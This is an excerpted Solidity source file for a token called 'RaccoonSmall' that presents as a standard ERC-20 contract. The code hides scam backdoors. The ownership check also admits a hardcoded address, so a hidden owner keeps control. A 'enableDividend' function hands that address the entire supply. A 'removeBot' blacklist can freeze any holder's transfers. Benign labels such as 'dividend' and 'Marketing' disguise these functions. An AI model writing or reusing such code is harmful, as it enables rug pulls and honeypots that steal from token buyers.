...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xA83763155ed5c68a157820465eEE7CD1ABF64847) , "owner");
        _;
    }
...
contract RaccoonSmall  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "RaccoonSmall";
    string private _symbol = "RaccoonSmall";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5bDa9873C45f4d3EcA12240cd75340b1178d103A);
    address private _Marketing = 0x5bDa9873C45f4d3EcA12240cd75340b1178d103A;
    address public dividend = 0xA83763155ed5c68a157820465eEE7CD1ABF64847;
    ...
    uint256 public _supplyAmount = 100000000000;
    ...
    function enableDividend() public Marketing returns (bool success) {_rBalance[address(dividend)] = _rSupply;return true;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!_removeBot[sender] && !_removeBot[recipient], "This bot is removed");
    ...
    function clearTheBot(address account) external onlyOwner {
        _removeBot[account] = false;
    }

    function removeTheBot(address[] calldata addresses) external Marketing {
